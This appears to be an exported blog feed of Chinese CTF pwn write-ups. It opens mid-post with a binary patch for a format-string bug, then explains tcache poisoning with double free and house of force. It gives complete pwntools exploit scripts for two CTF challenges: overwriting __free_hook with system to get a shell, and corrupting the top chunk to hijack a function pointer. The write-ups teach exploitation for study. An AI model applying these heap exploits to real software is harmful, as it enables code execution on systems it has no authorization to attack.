<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// gcc fmt.c -o fmt -no-pie -w</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char b[100];</span><br><span class="line">    scanf(&quot;%s&quot;, b);</span><br><span class="line">    printf(b);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们运行该代码时<img src="/2023/06/21/awd/2.png" alt="2"></p>
<p>当我们正常输入时，可以看到并没有什么问题，可是当我们输入格式化字符串%s时却出现了一些奇怪的输出，</p>
<p>这是因为我们在printf函数上并没有规定b的输出格式，从而导致了内存泄漏的问题。解决方法呢，思路也很简单</p>
<p>就是再给printf函数添加一个%s不就行了嘛，可是要怎么添加呢，直接加上去肯定不现实，因为比赛时人家肯定不会给你C语言源代码，这时候我们就要想到人家给你的文件进行反汇编修改，这时候就要用到IDA一个插件keypatch<img src="/2023/06/21/awd/3.png" alt="3"></p>
<p>然后找到我们要修改的函数<img src="/2023/06/21/awd/4.png" alt="4"></p>
<p>先确定我们的思路就是将printf(b);修改为printf(“%s”,b);所以我们要将printf函数的第一个参数修改%s,第二个参数修改为b;</p>
<p>但是这里我们就要注意几个问题：</p>
<p>1.我们在修改一个地方的时候别的地方会不会改变；</p>
<p>2.在没有%s的情况下怎么办；</p>
<p>3.最重要的还是如何修改；</p>
<p>首先呢，第一个问题，肯定是会变的，因此我们要将变化的这一段重新放回到一个地方进行修改，可问题是在哪里修改呢，得在一个有执行权限的地方<img src="/2023/06/21/awd/5.png" alt="5"></p>
<p>在gdb中调试可知道0x400000~0x401000是由可执行权限的<img src="/2023/06/21/awd/6.png" alt="6">因此我们可以jmp到0x4006b9的地方来部署我们的汇编。</p>
<p>接下来解决第二个问题，如何增加%s，我们可以在rodata段进行二进制修改<img src="/2023/06/21/awd/7.png" alt="7"></p>
<p>将0x4006b1和0x4006b2的地方将0和2修改为%和s（前提是这里没有被利用）查询%和s的ascll码分别为25和73<img src="/2023/06/21/awd/8.png" alt="8"></p>
<p>那么第三个问题自然就简单了，思路为先跳转到.eh_frame_hdr，在将%s传入rdi,b传入rsi,再跳转到刚才的代码中</p>
<p>那么汇编代码就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0x4006b9            //最后要nop一下</span><br><span class="line">lea rax,[rbp-0x70]             //fomat</span><br><span class="line">mov rsi,rax</span><br><span class="line">lea rdi,[0x4006b1]             //%s</span><br><span class="line">jmp 0x4005fd</span><br></pre></td></tr></table></figure>

<p>最后呢要在这里应用一下才有效哦<img src="/2023/06/21/awd/9.png" alt="9"></p>
<p>然后我们保存文件再来gdb调试一下<img src="/2023/06/21/awd/10.png" alt="10"></p>
<p>可以看到已经成功地修改我们运行测试一下<img src="/2023/06/21/awd/12.png" alt="12"></p>
<p>可以看到该程序的输出已经正常。</p>
<p>可是呢该程序是没有开启pie保护的，如果开启了pie保护呢，那我们在jmp的时候地址岂不是不确定了，但是我在开启pie式的时候发现按照上面的地址方式（开了pie时成了偏移）照样行得通。</p>
<p>先写这么多吧。</p>
]]></content>
  </entry>
  <entry>
    <title>对tcache poisoning和doublefree的简单理解</title>
    <url>/2023/06/29/tcache-poisoning-doublefree/</url>
    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
<p>以下纯属作者个人的理解</p>
<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2023/06/29/tcache-poisoning-doublefree/1.png"></p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/2.png"></p>
<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/29/tcache-poisoning-doublefree/3.png"></p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/4.png"></p>
<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/29/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
<p>接下看来以[ACTF_2019_message]为例</p>
<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
<p>提取码：chen]:</p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/8.png"></p>
<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
<p>查看保护：</p>
<p><img src="/2023/06/29/tcache-poisoning-doublefree/9.png"></p>
<p>没有开PIE，RELRO全部开启。</p>
<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
<p>由于题比较简单，不作一一解释</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>初步探讨house of force</title>
    <url>/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/</url>
    <content><![CDATA[<p>本篇呢主要是讲讲我对house  of  force 的一个初步的理解，house of force呢算是堆利用手法中一个入门的手法，本人也是刚接触堆，所以还有很多地方不是很懂。</p>
<p>什么是 house of force呢，简单来说就是通过控制top_chunk的size位，将top_chunk更新到任意一个地址，从而能够通过申请堆块可以任意地址写。</p>
<p>那么这里就有问题了，为什么通过控制size位的大小就能申请堆块达到任意写了呢？</p>
<p>我们先来看看  glibc对于top chunk的验证：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) <span class="comment">#top_chunk的大小&gt;=你申请堆块的大小+最小size  </span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, <span class="built_in">bytes</span>);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>主要意思就是只要通过这个if语句，那么就可以通过对top_chunk的认证，那么重点来了，我们怎么样可以申请任意大小size的堆块呢，很明显只要通过这个if语句就行了，也就是把**(unsigned long) (size)**做到无限大，那么什么样的数在unsigned long 才是无限大呢，可以告诉你的是 -1是最大的，-1大于所有负整数也大于有符号的正整数。</p>
<p>所以我们可以将top_chunk的size大小设置为<em><strong>0xffffffffffffffff</strong></em>这样我们就可以申请任意大小的堆块地址啦（当然仅限于在<strong>2.23和2.27</strong>的libc版本）。</p>
<p>找一个例题</p>
<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p>链接：<a href="https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w">https://pan.baidu.com/s/1slc_CFbR2ViFrwpRW8Ty4w</a><br>提取码：chen</p>
<p>查看保护</p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/1.png" alt="1689504121976"></p>
<p>没有开启pie，rerlo也没有全开。</p>
<p>查看主函数<img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/2.png" alt="1689504536074"></p>
<p>可以看到该程序一开始申请了一个0x10的堆块；</p>
<p>将 hello_message 函数的地址赋给 v4 指向的第一个函数指针；</p>
<p>将 goodbye_message 函数的地址赋给 v4 指向的第二个函数指针；</p>
<p>然后**(*v4)()**表示调用了v4 指向的第一个函数指针，简单来说就是执行了第一个函数；</p>
<p>后面就是构造了一个菜单；</p>
<p>输入5的时候 **v4[1] () **表示调用了v4 指向的第二个函数指针，然后退出。</p>
<p>可以看到该函数还有一个后门</p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/3.png" alt="1689505691847"></p>
<p>现在我们的初步的思路就是，让程序去执行这个后门函数从而获取到flag，那么很容易就能想到我们可以使用上面我说的v4这个堆块，改变他第二个函数的指针为后门函数的地址从而让程序去执行这个后门函数,那么怎么修改呢，我们当然只能通过修改v4这个堆块来实现。</p>
<p>可是v4这个堆块是系统自己申请的，我们无法利用菜单直接进行修改，但是我们可以通过house of force 来把v4这个堆块再次放入到top_chunk里面（为什么说<strong>再次</strong>呢，因为一般的堆块都是由top_chunk切割而来的）这样我们就可以控制v4这个堆块啦。</p>
<p>那么具体怎么操作呢？</p>
<p>首先我们先申请一个0x30的堆块（为了通过堆溢出来修改top_chunk的size做准备）</p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/4.png" alt="1689506951144"></p>
<p>然后通过溢出修改top_chunk的size位为<strong>0xffffffffffffffff</strong></p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/5.png" alt="1689507156442"></p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/6.png" alt="1689507328332"></p>
<p>接下来我们申请-0x70的堆块（依然满足修改后的if判断），这样top_chunk的指针刚好就可以到达v4堆块</p>
<p><img src="/2023/07/07/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/7.png" alt="1689507619495"></p>
<p>最后就可以把v4再申请出来修改指针啦</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ind,index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;aaaa&quot;</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>悄悄插一句，这个方法只能打通本地，因为这个后门是假的，打远端还得用unlink……</p>
]]></content>
  </entry>
</search>
